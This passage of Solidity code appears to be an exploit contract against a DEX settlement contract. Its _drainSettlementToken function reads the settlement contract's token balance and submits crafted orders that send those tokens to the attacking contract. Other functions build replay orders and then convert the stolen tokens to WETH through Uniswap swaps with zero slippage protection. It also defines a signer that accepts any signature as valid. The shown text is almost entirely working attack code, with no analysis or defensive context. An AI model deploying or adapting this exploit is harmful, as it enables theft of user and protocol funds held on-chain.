        _toWethBestEffort(USDT);
    }

    function _buildReplayOrder(uint256 salt, uint256 takingAmount)
        internal
        view
        returns (IOrderMixinLike.Order memory order)
    {
        order = IOrderMixinLike.Order({
            salt: salt,
            makerAsset: replayMakerAsset,
            takerAsset: USDC,
            maker: replayMaker,
            receiver: address(this),
            allowedSender: SETTLEMENT,
            makingAmount: 1,
            takingAmount: takingAmount,
            offsets: 0,
            interactions: hex""
        });
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _drainSettlementToken(
        address takerAsset,
        address maker,
        address makerAsset,
        address resolver,
        uint256 uniq
    ) internal {
        uint256 settlementBalance = _safeBalanceOf(takerAsset, SETTLEMENT);
        if (settlementBalance == 0) return;

        IOrderMixinLike.Order memory order = IOrderMixinLike.Order({
            salt: uniq,
            makerAsset: makerAsset,
            takerAsset: takerAsset,
            maker: maker,
            receiver: address(this),
            allowedSender: address(0),
            makingAmount: settlementBalance,
            takingAmount: settlementBalance,
            offsets: 0,
            interactions: hex"0000000000"
        });

        bytes memory interaction = abi.encodePacked(
            SETTLEMENT,
            bytes1(0x01),
            resolver
        );

        bytes memory settleData = abi.encode(
            order,
            bytes(""),
            interaction,
            uint256(0),
            settlementBalance,
            uint256(0),
            SETTLEMENT
        );

        // Continue scanning other tokens if one attempt fails.
        try ISettlement(SETTLEMENT).settleOrders(settleData) {} catch {}
    }

    function _toWethBestEffort(address token) internal {
        uint256 bal = _safeBalanceOf(token, address(this));
        if (bal == 0) return;
        if (token == WETH) return;

        if (!_forceApprove(token, UNISWAP_V2_ROUTER, type(uint256).max)) return;
        _forceApprove(token, UNISWAP_V3_ROUTER, type(uint256).max);

        if (_swapTokenToToken(token, WETH, bal)) return;
        if (_swapTokenToTokenV3AllFees(token, WETH, bal)) return;

        if (token != USDC && _swapTokenToToken(token, USDC, bal)) {
            _toWethBestEffort(USDC);
            return;
        }
        if (token != USDC && _swapTokenToTokenV3AllFees(token, USDC, bal)) {
            _toWethBestEffort(USDC);
            return;
        }

        if (token != USDT && _swapTokenToToken(token, USDT, bal)) {
            _toWethBestEffort(USDT);
            return;
        }
        if (token != USDT && _swapTokenToTokenV3AllFees(token, USDT, bal)) {
            _toWethBestEffort(USDT);
            return;
        }

        if (token != DAI && _swapTokenToToken(token, DAI, bal)) {
            _toWethBestEffort(DAI);
            return;
        }
        if (token != DAI && _swapTokenToTokenV3AllFees(token, DAI, bal)) {
            _toWethBestEffort(DAI);
            return;
        }

        if (token != WBTC && _swapTokenToToken(token, WBTC, bal)) {
            _toWethBestEffort(WBTC);
        }
        if (token != WBTC && _swapTokenToTokenV3AllFees(token, WBTC, bal)) {
            _toWethBestEffort(WBTC);
        }
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20.balanceOf.selector, account)
        );
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok0, bytes memory data0) = token.call(
            abi.encodeWithSelector(IERC20.approve.selector, spender, uint256(0))
        );
        if (ok0) {
            if (!(data0.length == 0 || abi.decode(data0, (bool)))) return false;
        }
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20.approve.selector, spender, amount)
        );
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _swapTokenToToken(address tokenIn, address tokenOut, uint256 amountIn) internal returns (bool) {
        if (amountIn == 0 || tokenIn == tokenOut) return true;

        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        (bool ok,) = UNISWAP_V2_ROUTER.call(
            abi.encodeWithSelector(
                IUniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
                amountIn,
                uint256(0),
                path,
                address(this),
                block.timestamp
            )
        );
        return ok;
    }

    function _swapTokenToTokenV3AllFees(address tokenIn, address tokenOut, uint256 amountIn) internal returns (bool) {
        if (amountIn == 0 || tokenIn == tokenOut) return true;

        if (_swapTokenToTokenV3(tokenIn, tokenOut, 500, amountIn)) return true;
        if (_swapTokenToTokenV3(tokenIn, tokenOut, 3000, amountIn)) return true;
        if (_swapTokenToTokenV3(tokenIn, tokenOut, 10000, amountIn)) return true;
        return _swapTokenToTokenV3(tokenIn, tokenOut, 100, amountIn);
    }

    function _swapTokenToTokenV3(
        address tokenIn,
        address tokenOut,
        uint24 fee,
        uint256 amountIn
    ) internal returns (bool) {
        (bool ok,) = UNISWAP_V3_ROUTER.call(
            abi.encodeWithSelector(
                IUniswapV3Router.exactInputSingle.selector,
                IUniswapV3Router.ExactInputSingleParams({
                    tokenIn: tokenIn,
                    tokenOut: tokenOut,
                    fee: fee,
                    recipient: address(this),
                    deadline: block.timestamp,
                    amountIn: amountIn,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            )
        );
        return ok;
    }

    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return 0x1626ba7e;
    }
    
    // Helper function to receive native tokens
    receive() external payable {}
    
    // Fallback function
    fallback() external payable {}
}

contract AlwaysValidSignatureMaker {
    bytes4 internal constant MAGIC = 0x1626ba7e;

    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return MAGIC;
    }
}

